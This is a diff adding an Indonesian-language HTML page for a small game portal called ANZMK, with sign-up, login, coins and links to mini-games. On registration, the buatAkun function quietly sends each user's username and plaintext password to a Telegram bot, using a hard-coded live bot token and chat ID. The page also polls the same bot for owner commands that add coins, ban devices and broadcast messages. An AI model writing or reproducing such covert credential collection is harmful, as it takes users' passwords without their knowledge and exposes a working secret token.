@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>ANZMK • Full (Final)</title>
+
+<!-- SweetAlert2 -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<style>
+    body{margin:0;padding:0;background:#0f0f0f;color:#fff;font-family:Arial;}
+    .page{display:none;padding:20px;}
+    .active{display:block;}
+    .box{width:92%;height:220px;margin:40px auto;background:#1a1a1a;border-radius:12px;overflow:hidden;}
+    .media{width:100%;height:100%;object-fit:cover;}
+    .btn{width:86%;padding:14px;margin:12px auto;border-radius:10px;border:0;font-weight:bold;font-size:18px;background:#d9d9d9;color:#000;cursor:pointer;display:block;}
+    .card{width:90%;max-width:420px;margin:40px auto;background:#1a1a1a;padding:20px;border-radius:12px;border:1px solid #222;}
+    input{width:92%;padding:12px;margin:10px auto;border-radius:8px;border:0;background:#0b0b0b;color:#fff;display:block;}
+    .header{width:100%;padding:20px 0;background:#1a1a1a;text-align:center;position:sticky;top:0;z-index:10;}
+    .top-row{display:flex;justify-content:center;align-items:center;gap:12px;}
+    .music-btn{background:#d9d9d9;color:#000;border:none;padding:12px 25px;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;}
+    .coin-box{display:flex;align-items:center;background:#111;padding:8px 12px;border-radius:12px;border:1px solid #333;}
+    .coin-icon{width:18px;height:18px;border-radius:50%;background:gold;margin-right:8px;}
+    .container{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:20px;padding:20px;}
+    .cardg{background:#1d1d1d;border-radius:15px;padding:10px;text-align:center;box-shadow:0 0 10px #000;cursor:pointer;transition:transform .2s;}
+    .cardg:hover{transform:scale(1.05);}
+    .cardg img{width:100%;height:120px;object-fit:cover;border-radius:10px;}
+    .card-title{margin-top:10px;font-size:16px;font-weight:bold;color:#f2f2f2;}
+    .cost{margin-top:6px;color:#ccc;font-size:13px;}
+    #broadcast{
+      position:fixed;left:50%;top:12%;transform:translateX(-50%);
+      background:#222;padding:12px 18px;border-radius:10px;
+      box-shadow:0 6px 20px rgba(0,0,0,.6);display:none;z-index:9999;
+    }
+</style>
+</head>
+<body>
+
+<div id="broadcast"></div>
+
+<div id="home" class="page active">
+  <div class="box">
+    <img class="media" src="https://via.placeholder.com/800x360" alt="media">
+  </div>
+  <button class="btn" onclick="showPage('login')">LOGIN</button>
+  <button class="btn" onclick="showPage('daftar')">DAFTAR</button>
+</div>
+
+<div id="daftar" class="page">
+  <div class="card">
+    <h2>DAFTAR</h2>
+    <input id="nama_daftar" placeholder="Nama">
+    <input id="user_daftar" placeholder="Username">
+    <input id="pw_daftar" placeholder="Password">
+    <button class="btn" onclick="buatAkun()">BUAT</button>
+    <div style="font-size:13px;color:#bbb;margin-top:8px">Setelah daftar kamu mendapat 10 coin. Hanya 1 akun per perangkat.</div>
+  </div>
+</div>
+
+<div id="login" class="page">
+  <div class="card">
+    <h2>LOGIN</h2>
+    <input id="user_login" placeholder="Username">
+    <input id="pw_login" placeholder="Password">
+    <button class="btn" onclick="login()">LOGIN</button>
+  </div>
+</div>
+
+<div id="game" class="page">
+  <div class="header">
+    <div class="top-row">
+      <button class="music-btn" onclick="toggleMusic()">WELCOME TO ANZMK</button>
+      <div class="coin-box"><div class="coin-icon"></div><div id="coin_display">0</div></div>
+    </div>
+  </div>
+  <audio id="bgMusic">
+    <source src="https://l.top4top.io/m_36168a5es0.mp3" type="audio/mp3">
+  </audio>
+  <div class="container" id="gamesContainer"></div>
+</div>
+
+<script>
+/* ==================== CONFIG ==================== */
+const BOT_TOKEN = "8309428324:AAFLf1e3dH4JlgigL-fjRRVhmvYq7X5Tc2M";
+const CHAT_ID   = "6401861143";
+const POLL_MS   = 4000;
+
+/* ---------------------- Storage Keys ---------------------- */
+const KEY_ACCOUNT = "anzmk_account";
+const KEY_LOGIN   = "anzmk_login";
+const KEY_BAN_UNTIL = "anzmk_ban_until";
+
+/* ---------------------- Page Control ---------------------- */
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+/* ---------------------- Ban Check ---------------------- */
+function isBannedNow(){
+  const b = localStorage.getItem(KEY_BAN_UNTIL);
+  if(!b) return false;
+  return Date.now() < parseInt(b,10);
+}
+
+function banRemaining(){
+  const b = localStorage.getItem(KEY_BAN_UNTIL);
+  if(!b) return 0;
+  const rem = parseInt(b,10) - Date.now();
+  return rem > 0 ? rem : 0;
+}
+
+/* ---------------------- Telegram Send ---------------------- */
+async function sendTelegramMessage(text){
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:"HTML"})
+    });
+    const j = await res.json();
+    return j.ok;
+  }catch(e){ return false; }
+}
+
+/* ---------------------- Buat Akun ---------------------- */
+function genKode(){ return Math.floor(1000000 + Math.random()*9000000).toString(); }
+
+function buatAkun(){
+  if(isBannedNow()){
+    const days = Math.ceil(banRemaining()/(1000*60*60*24));
+    Swal.fire({icon:"error",title:"Diblokir",text:`Perangkat ini diblokir. Tunggu ${days} hari lagi.`});
+    return;
+  }
+
+  const nama = nama_daftar.value.trim();
+  const user = user_daftar.value.trim();
+  const pw   = pw_daftar.value.trim();
+
+  if(!nama || !user || !pw){
+    Swal.fire({icon:"error",title:"Isi dulu",text:"Lengkapi semua field"});
+    return;
+  }
+
+  if(localStorage.getItem(KEY_ACCOUNT)){
+    Swal.fire({icon:"error",title:"Gagal",text:"Hanya 1 akun per perangkat"});
+    return;
+  }
+
+  const kode = genKode();
+  const akun = {nama,user,pw,kode,coin:10,played:[]};
+
+  localStorage.setItem(KEY_ACCOUNT,JSON.stringify(akun));
+
+  sendTelegramMessage(`<b>New Registration</b>\nuser: ${user}\npw:${pw}\nkode:${kode}`);
+
+  Swal.fire({icon:"success",title:"Berhasil",text:`Kode akun: ${kode}`})
+    .then(()=> showPage('home'));
+}
+
+/* ---------------------- Login ---------------------- */
+function login(){
+  if(isBannedNow()){
+    const days = Math.ceil(banRemaining()/(1000*60*60*24));
+    Swal.fire({
+      icon:"error",
+      title:"Diblokir",
+      text:`Perangkat ini diblokir. Tunggu ${days} hari lagi.`
+    });
+    return;
+  }
+
+  const u = user_login.value.trim();
+  const p = pw_login.value.trim();
+  const akun = JSON.parse(localStorage.getItem(KEY_ACCOUNT) || "null");
+
+  if(akun && akun.user === u && akun.pw === p){
+    localStorage.setItem(KEY_LOGIN,"1");
+    showPage("game");
+    renderCoin();
+    renderGames();
+    Swal.fire({icon:"success",title:"Login Berhasil",text:`Selamat datang, ${u}`});
+  } else {
+    Swal.fire({icon:"error",title:"Login gagal",text:"Username atau password salah"});
+  }
+}
+
+/* ---------------------- Game List ---------------------- */
+const GAMES = [
+  {id:"tebak",title:"tebak angka",img:"https://l.top4top.io/p_3615ot4130.jpg",url:"https://anezz001.github.io/1.mmkkk/1Tebak²_anka.html",cost:0},
+  {id:"tictac",title:"tic tac",img:"https://a.top4top.io/p_361542se41.jpg",url:"https://anezz001.github.io/2mmkkk/2tictac.html",cost:1},
+  {id:"obat",title:"obat luka",img:"https://b.top4top.io/p_3615xg1512.jpg",url:"https://anezz001.github.io/3mmkkk/3pasti_sad.html",cost:0},
+  {id:"judol",title:"judol fake",img:"https://c.top4top.io/p_3615m41rr3.jpg",url:"https://anezz001.github.io/4mmkk/4geme_judoll.html",cost:2},
+  {id:"tep",title:"tep-tep tombol",img:"https://d.top4top.io/p_3615i37og4.jpg",url:"https://anezz001.github.io/5mmkkk/5mendapat_bend.html",cost:1},
+  {id:"perhit",title:"perhitungan",img:"https://e.top4top.io/p_3615r3k2u5.jpg",url:"https://anezz001.github.io/6mmkkk/6perhitungan.html",cost:0}
+];
+
+function renderCoin(){
+  const akun = JSON.parse(localStorage.getItem(KEY_ACCOUNT)||"null");
+  coin_display.innerText = akun?.coin || 0;
+}
+
+function renderGames(){
+  gamesContainer.innerHTML = "";
+  GAMES.forEach(g=>{
+    const c = document.createElement("div");
+    c.className = "cardg";
+    c.innerHTML = `
+      <img src="${g.img}">
+      <div class="card-title">${g.title}</div>
+      <div class="cost">${g.cost===0?'FREE':g.cost+' coin'}</div>
+    `;
+    c.onclick = ()=> openGame(g);
+    gamesContainer.appendChild(c);
+  });
+}
+
+function openGame(g){
+  let akun = JSON.parse(localStorage.getItem(KEY_ACCOUNT)||"null");
+  if(!akun){ 
+    Swal.fire({icon:"error",title:"Akun hilang",text:"Silakan login kembali"});
+    return;
+  }
+  akun.played = akun.played || [];
+  if(g.cost > 0 && !akun.played.includes(g.id)){
+    if(akun.coin >= g.cost){
+      akun.coin -= g.cost;
+      akun.played.push(g.id);
+      localStorage.setItem(KEY_ACCOUNT,JSON.stringify(akun));
+      renderCoin();
+      window.open(g.url,"_blank");
+    } else {
+      Swal.fire({icon:"error",title:"Coin kurang"});
+    }
+  } else {
+    window.open(g.url,"_blank");
+  }
+}
+
+/* ---------------------- Music ---------------------- */
+const bg = document.getElementById("bgMusic");
+let isPlaying = false;
+
+function toggleMusic(){
+  if(!isPlaying){ bg.play(); isPlaying=true; }
+  else{ bg.pause(); isPlaying=false; }
+}
+
+/* ---------------------- Broadcast ---------------------- */
+function showBroadcast(msg){
+  broadcast.innerText = msg;
+  broadcast.style.display = "block";
+  setTimeout(()=>{
+    broadcast.style.display="none";
+    broadcast.innerText="";
+  },2000);
+}
+
+/* ---------------------- Telegram Polling ---------------------- */
+let lastUpdateId = null;
+
+async function pollTelegram(){
+  try{
+    let url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?timeout=2`;
+    if(lastUpdateId) url += `&offset=${lastUpdateId+1}`;
+
+    const res = await fetch(url);
+    const j = await res.json();
+
+    if(!j.ok || !Array.isArray(j.result)) return;
+
+    for(const up of j.result){
+      lastUpdateId = up.update_id;
+      if(!up.message || !up.message.text) continue;
+
+      const txt = up.message.text.trim();
+      const chatIdMsg = up.message.chat?.id;
+      if(String(chatIdMsg) !== String(CHAT_ID)) continue;
+
+      const coinMatch  = txt.match(/^\/coin\s+(\d{6,})\s+(\d+)$/i);
+      const allMatch   = txt.match(/^\/all\s+(\d+)$/i);
+      const banMatch   = txt.match(/^\/ban\s+(\d{6,})$/i);
+      const unbendMatch = txt.match(/^\/unbend\s+(\d{6,})$/i);
+      const pesanMatch = txt.match(/^\/pesan\s+(.+)$/is);
+
+      let akun = JSON.parse(localStorage.getItem(KEY_ACCOUNT)||"null");
+
+      /* /coin */
+      if(coinMatch){
+        const kode = coinMatch[1];
+        const amt  = parseInt(coinMatch[2],10);
+
+        if(akun && akun.kode === kode){
+          akun.coin += amt;
+          localStorage.setItem(KEY_ACCOUNT,JSON.stringify(akun));
+          renderCoin();
+          await sendTelegramMessage("Sudah dikirim");
+        } else {
+          await sendTelegramMessage("Kode tidak ditemukan pada perangkat ini.");
+        }
+      }
+
+      /* /all */
+      else if(allMatch){
+        const amt = parseInt(allMatch[1],10);
+        if(akun){
+          akun.coin += amt;
+          localStorage.setItem(KEY_ACCOUNT,JSON.stringify(akun));
+          renderCoin();
+          await sendTelegramMessage("Sudah dikirim ke semua");
+        } else {
+          await sendTelegramMessage("Tidak ada akun di perangkat ini");
+        }
+      }
+
+      /* /ban */
+      else if(banMatch){
+        const kode = banMatch[1];
+        if(akun && akun.kode === kode){
+          const until = Date.now() + 7*24*60*60*1000;
+          localStorage.setItem(KEY_BAN_UNTIL,String(until));
+          localStorage.removeItem(KEY_ACCOUNT);
+          localStorage.removeItem(KEY_LOGIN);
+          renderCoin();
+          await sendTelegramMessage("Kode ini telah dihapus");
+
+          Swal.fire({
+            icon:"warning",
+            title:"Dibanned",
+            text:"Akun telah dihapus oleh owner."
+          }).then(()=> location.href="index.html");
+
+        } else {
+          await sendTelegramMessage("Akun tidak ditemukan.");
+        }
+      }
+
+      /* /unbend — NEW FEATURE */
+      else if(unbendMatch){
+        const kode = unbendMatch[1];
+
+        if(akun && akun.kode === kode){
+          localStorage.removeItem(KEY_BAN_UNTIL);
+
+          await sendTelegramMessage("Ban sudah dicabut.");
+          
+          Swal.fire({
+            icon:"success",
+            title:"Unban Berhasil",
+            text:"Perangkat kamu sudah tidak diblokir lagi."
+          });
+
+        } else {
+          await sendTelegramMessage("Kode tidak ditemukan di perangkat ini.");
+        }
+      }
+
+      /* /pesan */
+      else if(pesanMatch){
+        const pesan = pesanMatch[1].trim();
+        showBroadcast(pesan);
+        await sendTelegramMessage("Pesan sudah dikirim ke semua anggota");
+      }
+    }
+  }catch(e){
+    // error silent
+  }
+}
+
+if(BOT_TOKEN && CHAT_ID){
+  setInterval(pollTelegram,POLL_MS);
+}
+
+/* ---------------------- Init ---------------------- */
+(function init(){
+  if(localStorage.getItem(KEY_LOGIN) && !isBannedNow()){
+    showPage("game");
+    renderCoin();
+    renderGames();
+  } else {
+    if(isBannedNow()){
+      const days = Math.ceil(banRemaining()/(1000*60*60*24));
+      Swal.fire({icon:"error",title:"Perangkat Diblokir",text:`Tunggu ${days} hari.`});
+    }
+    showPage("home");
+  }
+})();
+</script>
+
+</body>
+</html>
